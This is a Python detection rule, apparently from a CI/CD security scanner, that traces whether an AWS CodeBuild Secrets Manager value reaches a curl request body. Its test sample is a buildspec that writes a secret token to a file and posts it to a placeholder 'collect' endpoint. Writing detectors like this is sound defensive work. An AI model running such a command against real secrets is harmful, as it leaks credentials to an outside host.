"""Source-bound CodeBuild Secrets Manager value to a curl body."""

from __future__ import annotations

import re
import tempfile
from dataclasses import dataclass
from pathlib import Path

from taintly.models import IncompletePatternMatches, Platform, Rule, Severity
from taintly.parsers.structural import EventKind, walk_workflow
from taintly.parsers.structural.tokenizer import TokenKind, tokenize
from taintly.rules._secret_network_shell import (
    _BODY_CANDIDATE,
    _Flow,
    _physical_source,
    analyze_shell_rows,
)


@dataclass(frozen=True)
class _Notes:
    notes: tuple[str, ...]


class CodeBuildSecretNetworkPattern:
    def check(self, content: str, _lines: list[str]):
        if "secrets-manager" in content and _BODY_CANDIDATE.search(content):
            return IncompletePatternMatches(
                [], reason="SEC6-CB-003 physical buildspec source is required"
            )
        return []

    def self_test_check(self, sample: str):
        with tempfile.TemporaryDirectory() as root:
            path = Path(root) / "buildspec.yml"
            path.write_text(sample, encoding="utf8")
            return self.check_with_filepath(sample, sample.splitlines(), str(path))

    def self_test_mutation_applicable(self, source: str, mutant: str, operator: str) -> bool:
        if operator != "whitespace_pad":
            return True

        def owners(text: str) -> set[tuple[object, ...]] | None:
            events = tuple(walk_workflow("buildspec.yml", content=text, include_keys=True))
            if any(event.kind in {EventKind.ERROR, EventKind.CUTOFF} for event in events):
                return None
            return {
                event.path
                for event in events
                if event.kind is EventKind.LEAF_SCALAR
                and (
                    event.path in {("version",), ("env", "shell")}
                    or event.path[:2] == ("env", "secrets-manager")
                    or (
                        len(event.path) == 4
                        and event.path[:1] == ("phases",)
                        and event.path[2] == "commands"
                    )
                )
            }

        before, after = owners(source), owners(mutant)
        return not before or (after is not None and before <= after)

    def _analyze(self, content: str, filepath: str):
        if not ("secrets-manager" in content and _BODY_CANDIDATE.search(content)):
            return [], {}, None
        digest = _physical_source(filepath, content)
        if digest is None:
            return [], {}, "SEC6-CB-003 source identity is unavailable"
        events = tuple(walk_workflow(filepath, content=content, include_keys=True, recover=True))
        try:
            tokens = tuple(tokenize(content))
        except Exception:
            return [], {}, "SEC6-CB-003 YAML tokenization is incomplete"
        if any(
            event.kind in {EventKind.ERROR, EventKind.CUTOFF} or event.merge_origins
            for event in events
        ) or any(
            token.kind in {TokenKind.ALIAS, TokenKind.ANCHOR, TokenKind.MERGE_KEY}
            for token in tokens
        ):
            return [], {}, "SEC6-CB-003 candidate structure is ambiguous"
        leaves = [event for event in events if event.kind is EventKind.LEAF_SCALAR]
        paths = [event.path for event in leaves]
        if len(paths) != len(set(paths)):
            return [], {}, "SEC6-CB-003 duplicate source paths"
        values = {event.path: event for event in leaves}
        if values.get(("version",)) is None or values[("version",)].value != "0.2":
            return [], {}, "SEC6-CB-003 buildspec version 0.2 is required"
        if values.get(("env", "shell")) is None or values[("env", "shell")].value != "bash":
            return [], {}, "SEC6-CB-003 explicit Bash shell is required"
        sources = {
            str(event.path[2]): event
            for event in leaves
            if len(event.path) == 3
            and event.path[:2] == ("env", "secrets-manager")
            and isinstance(event.path[2], str)
            and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", event.path[2])
            and event.value
        }
        if not sources:
            return [], {}, "SEC6-CB-003 secret binding could not be resolved"
        if any(
            ("env", other, name) in values
            for name in sources
            for other in ("variables", "parameter-store")
        ):
            return [], {}, "SEC6-CB-003 buildspec variable source is overridden"
        commands = [
            event
            for event in leaves
            if len(event.path) == 4
            and event.path[0] == "phases"
            and event.path[2] == "commands"
            and type(event.path[3]) is int
        ]
        if len(commands) != 1:
            return [], {}, "SEC6-CB-003 multiple or missing command items need state analysis"
        command = commands[0]
        if (
            command.value_kind != "block_literal"
            or not command.block_lines
            or len(command.block_lines) > 60
        ):
            return [], {}, "SEC6-CB-003 literal command block is required"
        source_lines = content.splitlines()
        rows = tuple(command.block_lines)
        if any(
            line < 1
            or line > len(source_lines)
            or not source_lines[line - 1].rstrip().endswith(raw.rstrip())
            for line, raw in rows
        ):
            return [], {}, "SEC6-CB-003 command source correspondence is incomplete"
        if "\n".join(raw for _, raw in rows).rstrip("\n") != (command.value or "").rstrip("\n"):
            return [], {}, "SEC6-CB-003 command source correspondence is incomplete"
        initial = {name: _Flow(frozenset({f"secrets-manager:{name}"}), ()) for name in sources}
        flows, stopped = analyze_shell_rows(rows, initial)
        matches: list[tuple[int, str]] = []
        notes: dict[tuple[int, str], str] = {}
        for line, body, flow in flows:
            item = (line, body)
            matches.append(item)
            bindings = ", ".join(sorted(flow.secrets))
            hops = " -> ".join(f"{kind} line {number}" for number, kind in flow.hops)
            notes[item] = (
                f"Source SHA256 {digest}; CodeBuild {command.path[1]} phase; {bindings} "
                f"reaches curl body via {hops}. Build/project overrides, secret retrieval, "
                "execution, destination trust and delivery are unknown."
            )
        return (
            matches,
            notes,
            (
                "SEC6-CB-003 candidate path stopped at unsupported shell operation"
                if stopped
                else None
            ),
        )

    def check_with_filepath(self, content: str, _lines: list[str], filepath: str):
        matches, _notes, incomplete = self._analyze(content, filepath)
        return IncompletePatternMatches(matches, reason=incomplete) if incomplete else matches

    def context_notes_for_matches(
        self, content: str, filepath: str, matches: list[tuple[int, str]]
    ):
        _matches, notes, _incomplete = self._analyze(content, filepath)
        return [_Notes((notes[item],)) if item in notes else None for item in matches]


_SAMPLE = (
    "version: 0.2\nenv:\n  shell: bash\n  secrets-manager:\n    TOKEN: prod/token\n"
    "phases:\n  build:\n    commands:\n      - |\n"
    "        echo $TOKEN > token.txt\n"
    "        curl https://example.test/collect --data-binary @token.txt\n"
)

RULES = [
    Rule(
        id="SEC6-CB-003",
        title="CodeBuild secret may reach an outbound HTTP request body",
        severity=Severity.MEDIUM,
        platform=Platform.CODEBUILD,
        owasp_cicd="CICD-SEC-6",
        description="A source-bound Secrets Manager variable reaches a curl request body in one CodeBuild 0.2 Bash command block through a bounded shell path.",
        pattern=CodeBuildSecretNetworkPattern(),
        remediation="Review whether the endpoint is intended to receive this secret. If not, remove the body transfer; if delivery is confirmed, investigate the build and rotate the affected secret.",
        reference="https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html",
        test_positive=[_SAMPLE],
        test_negative=[
            _SAMPLE.replace("--data-binary @token.txt", '-H "Authorization: Bearer $TOKEN"')
        ],
        finding_family="credential_exposure",
        confidence="medium",
        review_needed=True,
    )
]
